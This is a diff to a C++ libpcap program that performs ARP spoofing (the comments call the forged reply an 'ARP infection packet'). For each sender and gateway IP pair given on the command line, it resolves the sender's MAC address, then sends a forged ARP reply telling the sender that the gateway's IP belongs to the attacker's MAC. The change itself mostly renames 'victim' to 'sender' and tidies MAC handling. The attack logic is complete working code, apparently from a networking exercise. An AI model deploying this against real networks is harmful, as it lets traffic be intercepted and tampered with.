@@ -62,18 +62,18 @@ int main(int argc, char* argv[]) {
 
 	/* Get mac addr (Attacker) */
 	uint8_t mac_addr[6] = {0};
-	uint8_t mac_addr_formed[18] = {0};
 	GetMacAddr(dev, mac_addr);
-	sprintf((char*)mac_addr_formed, "%02x:%02x:%02x:%02x:%02x:%02x", mac_addr[0], mac_addr[1], mac_addr[2], mac_addr[3], mac_addr[4], mac_addr[5]);
 	EthArpPacket packet;
 
-	unsigned int turn = argc / 2 - 1;
+	unsigned int count = argc / 2 - 1;
 
-	for(int i = 1; i < turn + 1; i++){
+	for(int i = 1; i < count + 1; i++){
+
+		Ip sender_ip = Ip(argv[2 * i]);
 
 		/* ARP request to get mac addr */
 		packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
-		packet.eth_.smac_ = Mac((const char*)mac_addr_formed);
+		packet.eth_.smac_ = Mac(mac_addr);
 		packet.eth_.type_ = htons(EthHdr::Arp);
 
 		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
@@ -81,10 +81,10 @@ int main(int argc, char* argv[]) {
 		packet.arp_.hln_ = Mac::SIZE;
 		packet.arp_.pln_ = Ip::SIZE;
 		packet.arp_.op_ = htons(ArpHdr::Request);
-		packet.arp_.smac_ = Mac((const char*)mac_addr_formed);
+		packet.arp_.smac_ = Mac(mac_addr);
 		packet.arp_.sip_ = htonl(Ip("0.0.0.0")); // my ip ?
 		packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
-		packet.arp_.tip_ = htonl(Ip(argv[2 * i])); // victim
+		packet.arp_.tip_ = htonl(sender_ip); // sender
 
 		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
 		if (res != 0) {
@@ -109,14 +109,14 @@ int main(int argc, char* argv[]) {
 				/* Get ARP header */
 				rcvpacket += sizeof(struct EthHdr);
 				arp_hdr = (PArpHdr)rcvpacket;
-				if(arp_hdr->sip().operator uint32_t()==Ip(argv[2 * i]).operator uint32_t()) break;
+				if(arp_hdr->sip() == Ip(argv[2 * i])) break;
 			}
 		}
-		Mac victim_mac = arp_hdr->smac();
+		Mac sender_mac = arp_hdr->smac();
 		
 		/* Send ARP infection packet */
-		packet.eth_.dmac_ = victim_mac; // victim
-		packet.eth_.smac_ = Mac((const char*)mac_addr_formed); // me
+		packet.eth_.dmac_ = sender_mac; // sender
+		packet.eth_.smac_ = Mac(mac_addr); // me
 		packet.eth_.type_ = htons(EthHdr::Arp);
 
 		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
@@ -124,10 +124,10 @@ int main(int argc, char* argv[]) {
 		packet.arp_.hln_ = Mac::SIZE;
 		packet.arp_.pln_ = Ip::SIZE;
 		packet.arp_.op_ = htons(ArpHdr::Reply); // reply! 
-		packet.arp_.smac_ = Mac((const char*)mac_addr_formed);  // me
+		packet.arp_.smac_ = Mac(mac_addr);  // me
 		packet.arp_.sip_ = htonl(Ip(argv[2 * i + 1])); // gateway
-		packet.arp_.tmac_ = victim_mac;
-		packet.arp_.tip_ = htonl(Ip(argv[2 * i])); // victim
+		packet.arp_.tmac_ = sender_mac;
+		packet.arp_.tip_ = htonl(Ip(argv[2 * i])); // sender
 
 		res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
 		if (res != 0) {
